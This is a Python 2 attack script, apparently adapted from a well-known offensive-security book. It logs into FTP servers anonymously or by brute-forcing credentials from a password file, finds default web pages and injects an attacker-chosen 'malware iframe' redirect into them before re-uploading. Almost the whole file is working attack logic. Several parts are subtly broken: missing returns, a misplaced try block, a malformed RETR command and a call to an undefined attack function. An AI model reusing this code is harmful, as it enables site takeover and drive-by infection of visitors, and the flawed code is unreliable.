# determine if website offers anonymous ftp access.
import ftplib
import optparse
import time
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'findThis@hide.com')
        print '\n[*] ' + str(hostname) + ' FTP Anonymous Login Successed'
        ftp.quit()
        True
    except Exception, e:
        print '\n[-] '+ str(hostname) + ' FTP Anonymous Login Failed'
        False
#host = '192.168.95.179'
#anonLogin(host)
def bruteLogin(hostname, passwdFile):
    passF = open(passwdFile, 'r')
    for line in passF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: '+ userName + ' ' + passWord
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userName, passWord)
        print '\n[*] ' + str(hostname) + ' FTP Login SucceededL: ' +\
        userName + ' ' + passWord
        ftp.quit()
        return (userName, passWord)
    except Exception, e:
        print '\n[-] '+ str(hostname) + ' FTP brute force Login Failed'
        return (None, None)
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents'
        print '[-] Skipping to next target.'
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.html' in fn or '.asp' in fn:
            print '[+] Found default page: ' + fileName
            retList.append(fileName)
    return retList
def injectPage(ftp, page, redirect):
    file = open(page + '.tmp', 'w')
    ftp.retrlines('RETR' + page, file.write)
    print '[+] Downloaded Page: ' + page
    file.write(redirect)
    file.close()
    print '[+] Injected malware iframe on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Upload Injected Page: ' + page

def main():
    parser = optparse.OptionParser('usage%prog ' +\
    '-H <target host> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest='tgtHost', type= 'string',\
    help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string',\
    help='specify password file')
    parser.add_option('-r', dest='redirect', type='string',\
    help='specify redirect pages')
    (options, args) = parser.parse_args()
    tgtHost = str(options.tgtHost).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHost == None or redirect == None:
        print parser.usage
        exit(0)
    for host in tgtHost:
        userName = None
        password = None
        if anonLogin(host) == True:
            userName = 'anonymous'
            password = 'findThis@hide.com'
            print '[+] Using Anonymous Attacks'
            attack(userName, password, host, redirect)
        elif passwdFile != None:
            (userName, password) = bruteLogin(host, passwdFile)
        if password != None:
            print '[-] Using Credent: ' + userName + '/' + password
            attack(userName, password, host, redirect)
if __name__ == '__main__':
    main()
